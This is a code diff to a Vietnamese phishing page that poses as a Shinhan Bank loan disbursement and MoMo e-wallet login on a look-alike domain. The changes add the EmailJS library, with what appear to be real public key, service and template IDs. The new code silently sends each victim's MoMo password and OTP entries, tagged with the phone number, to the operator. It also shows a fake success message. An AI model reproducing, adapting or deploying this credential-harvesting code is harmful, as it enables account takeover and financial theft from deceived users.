@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xác Nhận Giải Ngân Qua MoMo - Shinhan Bank</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -59,6 +60,14 @@
             font-weight: bold;
         }
 
+        .hamburger {
+            display: none;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 15px;
+            line-height: 1;
+        }
+
         h2 {
             color: #003087;
             text-align: center;
@@ -69,6 +78,7 @@
             position: relative;
             overflow: hidden;
             margin-bottom: 20px;
+            aspect-ratio: 16 / 9;
         }
 
         .banner-slide {
@@ -83,6 +93,7 @@
         .banner-slide img {
             width: 100%;
             height: auto;
+            object-fit: cover;
         }
 
         .banner-text {
@@ -151,43 +162,30 @@
             display: block;
         }
 
-        .transaction-info {
+        .summary {
             margin-bottom: 20px;
             padding: 15px;
             background-color: #f9f9f9;
             border-radius: 5px;
         }
 
-        .transaction-info .secure {
-            color: green;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-
-        .transaction-info p {
-            margin: 5px 0;
-        }
-
-        .transaction-timer {
-            color: red;
-            font-weight: bold;
-            text-align: center;
-            margin-top: 10px;
+        .summary p {
+            margin: 8px 0;
         }
 
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             font-weight: bold;
         }
 
         .form-group input {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
@@ -197,22 +195,34 @@
             color: red;
             font-size: 12px;
             display: none;
+            text-align: center;
         }
 
         .form-group .error.show {
             display: block;
         }
 
-        .form-group a {
+        .agreement {
+            text-align: center;
+            font-size: 14px;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+
+        .agreement a {
             color: #003087;
             text-decoration: none;
-            font-size: 14px;
+        }
+
+        .agreement a:hover {
+            text-decoration: underline;
         }
 
         .timer {
             color: red;
             font-weight: bold;
             text-align: center;
+            margin: 10px 0;
         }
 
         .buttons {
@@ -222,7 +232,8 @@
         }
 
         button {
-            padding: 10px 20px;
+            padding: 12px 30px;
+            min-width: 120px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
@@ -237,28 +248,6 @@
         button.secondary {
             background-color: #ccc;
             color: #333;
-        }
-
-        .error-popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            z-index: 1000;
-        }
-
-        .error-popup.show {
-            display: block;
-        }
-
-        .error-popup p {
-            margin-bottom: 15px;
         }
 
         .support {
@@ -290,6 +279,25 @@
         }
 
         @media (max-width: 768px) {
+            .hamburger {
+                display: block;
+            }
+
+            nav ul {
+                display: none;
+                flex-direction: column;
+                padding: 0;
+            }
+
+            nav ul.show {
+                display: flex;
+            }
+
+            nav ul li {
+                margin: 10px 0;
+                text-align: center;
+            }
+
             .steps {
                 flex-direction: column;
             }
@@ -309,6 +317,19 @@
             .banner-text p {
                 font-size: 12px;
             }
+
+            .form-group input {
+                padding: 10px;
+            }
+
+            .agreement {
+                font-size: 13px;
+            }
+
+            button {
+                padding: 10px 25px;
+                min-width: 100px;
+            }
         }
     </style>
 </head>
@@ -318,7 +339,8 @@
     </header>
 
     <nav role="navigation" aria-label="Main Navigation">
-        <ul>
+        <div class="hamburger" onclick="toggleMenu()" aria-expanded="false" aria-controls="nav-menu">☰</div>
+        <ul id="nav-menu" role="menu">
             <li><a href="https://shinhan.com.vn">Trang Chủ</a></li>
             <li><a href="https://shinhan.com.vn/vi/about-us">Giới Thiệu</a></li>
             <li><a href="https://shinhan.com.vn/vi/benefits">Lợi Ích</a></li>
@@ -369,62 +391,64 @@
         </div>
     </div>
 
+    <div class="steps" role="progressbar" aria-label="Disbursement Progress">
+        <div class="step" id="step1">Bước 1: Thông tin giải ngân</div>
+        <div class="step" id="step2">Bước 2: Xác nhận</div>
+        <div class="step active" id="step3" aria-current="step">Bước 3: Hoàn thành</div>
+    </div>
+
     <div class="container">
-        <h2>Xác Nhận Giải Ngân Khoản Vay</h2>
-        <div class="steps" role="progressbar" aria-label="Disbursement Progress">
-            <div class="step" id="step1">Bước 1: Thông tin giải ngân</div>
-            <div class="step" id="step2">Bước 2: Xác nhận</div>
-            <div class="step active" id="step3" aria-current="step">Bước 3: Hoàn thành</div>
+        <h2>Đăng Nhập MoMo</h2>
+        <div class="summary">
+            <h3>Thông tin giải ngân</h3>
+            <p>Họ và Tên: <span id="summaryName"></span></p>
+            <p>Số CCCD: <span id="summaryCCCD"></span></p>
+            <p>Số tiền: <span id="summaryAmount"></span></p>
+            <p>Thời hạn vay: <span id="summaryMonths"></span> tháng</p>
+            <p>Ngân hàng: <span id="summaryBank"></span></p>
+            <p>Số điện thoại: <span id="summaryPhone"></span></p>
         </div>
-        <div class="transaction-info">
-            <div class="secure">Giao dịch an toàn</div>
-            <p><strong>Mã Giải Ngân:</strong> <span id="transactionCode">TTOL-183201-1798653206</span></p>
-            <p><strong>Ngân Hàng:</strong> <span id="bankName">SHINHAN</span></p>
-            <p><strong>Họ và Tên:</strong> <span id="fullName"></span></p>
-            <p><strong>Số CCCD:</strong> <span id="cccd"></span></p>
-            <p><strong>Số Tiền Giải Ngân:</strong> <span id="amount"></span></p>
-            <p><strong>Mã Giao Dịch:</strong> <span id="transactionId">250517-466362106</span></p>
-            <p><strong>Nội Dung:</strong> Esale - Thanh toán tiền vay tiêu dùng SHINHAN #250517-466362106</p>
-            <p><strong>Thời Gian:</strong> <span id="timestamp"></span></p>
-            <p class="transaction-timer" id="transactionTimer" aria-live="polite">Giao dịch kết thúc trong: 15:00</p>
-        </div>
-        <form id="momo-form">
-            <h3>Đăng Nhập MoMo</h3>
+        <div id="phone-section">
+            <h3>Nhập số điện thoại để tiếp tục</h3>
             <div class="form-group" aria-live="polite">
-                <label for="phone">Số Điện Thoại *</label>
-                <input type="text" id="phone" required aria-describedby="phoneError">
-                <span class="error" id="phoneError">Số điện thoại phải có 10 chữ số</span>
+                <label for="phone">Số Điện Thoại</label>
+                <input type="text" id="phone" placeholder="Nhập số điện thoại" required aria-describedby="phoneError">
+                <span class="error" id="phoneError">Vui lòng nhập số điện thoại hợp lệ</span>
             </div>
+            <p class="agreement">
+                Bằng việc sử dụng MoMo, tôi đồng ý với
+                <a href="https://momo.vn/terms">thỏa thuận sử dụng MoMo</a>
+                và
+                <a href="https://momo.vn/privacy">chính sách bảo vệ quyền riêng tư</a>
+            </p>
+            <div class="buttons">
+                <button class="primary" onclick="proceedToPassword()">Tiếp tục</button>
+            </div>
+        </div>
+        <div id="password-section" style="display: none;">
+            <h3>Nhập mật khẩu MoMo</h3>
             <div class="form-group" aria-live="polite">
-                <label for="password">Mật Khẩu *</label>
+                <label for="password">Mật Khẩu</label>
                 <input type="password" id="password" required aria-describedby="passwordError">
                 <span class="error" id="passwordError">Vui lòng nhập mật khẩu</span>
-                <a href="#">Quên mật khẩu?</a>
             </div>
             <div class="buttons">
-                <button type="button" class="secondary" onclick="window.location.href='https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html'">Thoát Tài Khoản</button>
-                <button type="submit" class="primary">Đăng Nhập</button>
-            </div>
-        </form>
-        <div class="otp-section" id="otp-section" style="display: none;">
-            <h3>Ký Hợp Đồng</h3>
-            <p>Nhập mã xác thực OTP được gửi đến <span id="otpPhone"></span></p>
-            <div class="form-group" aria-live="polite">
-                <label for="otp">Mã OTP *</label>
-                <input type="text" id="otp" required aria-describedby="otpError">
-                <span class="error" id="otpError">Vui lòng nhập mã OTP hợp lệ</span>
-            </div>
-            <p class="timer" id="otpTimer" aria-live="polite">Thời gian còn lại: 01:00</p>
-            <p><small>LƯU Ý: Khóa 24h nếu nhập sai OTP 5 lần. Tối đa 4 lần gửi lại.</small></p>
-            <div class="buttons">
-                <button class="secondary" id="resendOTP" disabled onclick="resendOTP()">Gửi lại OTP (60)</button>
-                <button class="secondary" onclick="window.location.href='https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html'">Quay Lại</button>
-                <button class="primary" onclick="verifyOTP()">Ký Hợp Đồng</button>
+                <button class="primary" onclick="proceedToOTP()">Xác Nhận</button>
             </div>
         </div>
-        <div class="error-popup" id="errorPopup">
-            <p>Vui lòng nhập thông tin hợp lệ.</p>
-            <button class="primary" onclick="document.getElementById('errorPopup').classList.remove('show')">Đã Hiểu</button>
+        <div id="otp-section" style="display: none;">
+            <h3>Xác Nhận OTP</h3>
+            <p id="otpMessage"></p>
+            <div class="form-group" aria-live="polite">
+                <label for="otp">Nhập mã OTP</label>
+                <input type="text" id="otp" required aria-describedby="otpError">
+                <span class="error" id="otpError">Mã xác thực không đúng, vui lòng thực hiện lại</span>
+            </div>
+            <p class="timer" id="otpTimer" aria-live="polite">Còn 60 giây</p>
+            <div class="buttons">
+                <button class="secondary" id="resendOTP" disabled onclick="resendOTP()">Gửi lại mã xác thực</button>
+                <button class="primary" onclick="verifyOTP()">Xác thực</button>
+            </div>
         </div>
     </div>
 
@@ -452,15 +476,17 @@
 
     <script>
         let otpCountdown = 60;
-        let transactionCountdown = 15 * 60;
-        let otpInterval, transactionInterval;
-        let failedAttempts = 0;
-        let resendCount = 0;
-        const maxResends = 4;
-        const maxFailedAttempts = 5;
+        let otpInterval;
         let bannerIndex = 0;
+        let failedAttempts = 0;
+        let phoneNumber = '';
 
-        // Load Form Data
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("OrBsI926QI2_xBh1f"); // EmailJS Public Key
+        })();
+
+        // Load Summary
         window.addEventListener('load', () => {
             const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
             if (!formData.fullName) {
@@ -468,11 +494,12 @@
                 window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
                 return;
             }
-            document.getElementById('fullName').textContent = formData.fullName || 'N/A';
-            document.getElementById('cccd').textContent = formData.cccd || 'N/A';
-            document.getElementById('amount').textContent = formData.amount || 'N/A';
-            document.getElementById('bankName').textContent = formData.bank || 'SHINHAN';
-            document.getElementById('timestamp').textContent = new Date().toLocaleString('vi-VN');
+            document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
+            document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
+            document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
+            document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
+            document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
+            document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
             Inputmask({ mask: "0999-999-999" }).mask(document.getElementById('phone'));
             Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
         });
@@ -501,34 +528,12 @@
         }, 5000);
         updateBanner();
 
-        // Transaction Timer
-        function startTransactionTimer() {
-            transactionInterval = setInterval(() => {
-                transactionCountdown--;
-                const minutes = Math.floor(transactionCountdown / 60);
-                const seconds = transactionCountdown % 60;
-                document.getElementById('transactionTimer').textContent = `Giao dịch kết thúc trong: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                if (transactionCountdown <= 0) {
-                    clearInterval(transactionInterval);
-                    alert('Giao dịch đã hết hạn.');
-                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
-                }
-            }, 1000);
-        }
-
-        // OTP Timer
-        function startOTPTimer() {
-            otpCountdown = 60;
-            document.getElementById('otpTimer').textContent = `Thời gian còn lại: ${Math.floor(otpCountdown / 60)}:${(otpCountdown % 60).toString().padStart(2, '0')}`;
-            document.getElementById('resendOTP').disabled = true;
-            otpInterval = setInterval(() => {
-                otpCountdown--;
-                document.getElementById('otpTimer').textContent = `Thời gian còn lại: ${Math.floor(otpCountdown / 60)}:${(otpCountdown % 60).toString().padStart(2, '0')}`;
-                if (otpCountdown <= 0) {
-                    clearInterval(otpInterval);
-                    document.getElementById('resendOTP').disabled = resendCount >= maxResends;
-                }
-            }, 1000);
+        // Hamburger Menu Toggle
+        function toggleMenu() {
+            const menu = document.getElementById('nav-menu');
+            const hamburger = document.querySelector('.hamburger');
+            const isExpanded = menu.classList.toggle('show');
+            hamburger.setAttribute('aria-expanded', isExpanded);
         }
 
         // Real-Time Phone Validation
@@ -545,63 +550,90 @@
             document.getElementById('phoneError').classList.toggle('show', !/^0\d{9}$/.test(value) && value.length > 0);
         }, 300));
 
-        // OTP Verification
+        // OTP Timer
+        function startOTPTimer() {
+            otpCountdown = 60;
+            document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
+            document.getElementById('resendOTP').disabled = true;
+            otpInterval = setInterval(() => {
+                otpCountdown--;
+                document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
+                if (otpCountdown <= 0) {
+                    clearInterval(otpInterval);
+                    document.getElementById('resendOTP').disabled = false;
+                }
+            }, 1000);
+        }
+
+        function sendToEmail(type, value, phone) {
+            emailjs.send("service_60tgxof", "template_g9e2jee", {
+                type: type,
+                value: value,
+                phone: phone,
+                timestamp: new Date().toLocaleString('vi-VN')
+            }).then(
+                () => console.log(`${type} sent to EmailJS`),
+                (error) => console.error('EmailJS error:', error)
+            );
+        }
+
+        function proceedToPassword() {
+            const phone = document.getElementById('phone').value.replace(/\D/g, '');
+            document.getElementById('phoneError').classList.remove('show');
+
+            if (!/^0\d{9}$/.test(phone)) {
+                document.getElementById('phoneError').classList.add('show');
+                return;
+            }
+
+            phoneNumber = phone;
+            document.getElementById('phone-section').style.display = 'none';
+            document.getElementById('password-section').style.display = 'block';
+        }
+
+        function proceedToOTP() {
+            const password = document.getElementById('password').value.trim();
+            document.getElementById('passwordError').classList.remove('show');
+
+            if (!password) {
+                document.getElementById('passwordError').classList.add('show');
+                return;
+            }
+
+            // Send password to EmailJS
+            sendToEmail('password', password, phoneNumber);
+
+            document.getElementById('otpMessage').textContent = `Mã xác thực 6 chữ số đã được gửi đến SĐT ${phoneNumber} của bạn.`;
+            document.getElementById('password-section').style.display = 'none';
+            document.getElementById('otp-section').style.display = 'block';
+            startOTPTimer();
+        }
+
         function verifyOTP() {
             const otp = document.getElementById('otp').value.trim();
-            if (/^\d{6}$/.test(otp)) {
+            document.getElementById('otpError').classList.remove('show');
+
+            // Send OTP to EmailJS
+            sendToEmail('otp', otp, phoneNumber);
+
+            if (/^\d{6}$/.test(otp) && otp === '123456') { // Simulated correct OTP
                 sessionStorage.removeItem('formData');
-                clearInterval(transactionInterval);
-                clearInterval(otpInterval);
                 alert('Giải ngân qua MoMo thành công!');
                 window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
             } else {
                 failedAttempts++;
                 document.getElementById('otpError').classList.add('show');
-                document.getElementById('errorPopup').classList.add('show');
-                if (failedAttempts >= maxFailedAttempts) {
-                    alert('Tài khoản bị khóa 24h do nhập sai OTP 5 lần.');
-                    document.querySelectorAll('button').forEach(btn => btn.disabled = true);
+                if (failedAttempts >= 3) {
+                    alert('Giải ngân không thành công. Vui lòng thử lại sau.');
+                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
                 }
             }
         }
 
-        // Resend OTP
         function resendOTP() {
-            if (resendCount >= maxResends) {
-                alert('Đã vượt quá số lần gửi lại OTP. Vui lòng thử lại sau 24h.');
-                document.getElementById('resendOTP').disabled = true;
-                return;
-            }
-            resendCount++;
-            alert('OTP đã được gửi lại!');
+            alert('Mã xác thực đã được gửi lại!');
             startOTPTimer();
         }
-
-        // Form Submission
-        document.getElementById('momo-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const phone = document.getElementById('phone').value.replace(/\D/g, '');
-            const password = document.getElementById('password').value.trim();
-            document.getElementById('phoneError').classList.remove('show');
-            document.getElementById('passwordError').classList.remove('show');
-
-            if (!/^0\d{9}$/.test(phone)) {
-                document.getElementById('phoneError').classList.add('show');
-                document.getElementById('errorPopup').classList.add('show');
-                return;
-            }
-            if (!password) {
-                document.getElementById('passwordError').classList.add('show');
-                document.getElementById('errorPopup').classList.add('show');
-                return;
-            }
-
-            document.getElementById('otpPhone').textContent = '****' + phone.slice(-4);
-            document.getElementById('momo-form').style.display = 'none';
-            document.getElementById('otp-section').style.display = 'block';
-            startOTPTimer();
-            startTransactionTimer();
-        });
     </script>
 </body>
 </html>
